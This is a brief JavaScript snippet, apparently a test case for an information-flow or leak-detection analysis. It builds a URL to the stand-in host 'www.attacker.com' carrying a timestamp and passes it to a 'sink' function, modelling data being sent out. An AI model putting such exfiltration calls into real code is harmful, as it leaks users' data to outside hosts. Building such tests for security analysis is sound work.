var i0 =  Math.floor((Math.random() * 10) + 1); 
var i1 =  Math.floor((Math.random() * 10) + 1); 

var h0 = lbl(i0);
var h1 = lbl(i1);

var t0 =  Date.now();

url = urll("www.attacker.com" + t0);
sink('Sink', '', url);

if (h1 > 5) {h0 = h1;} 





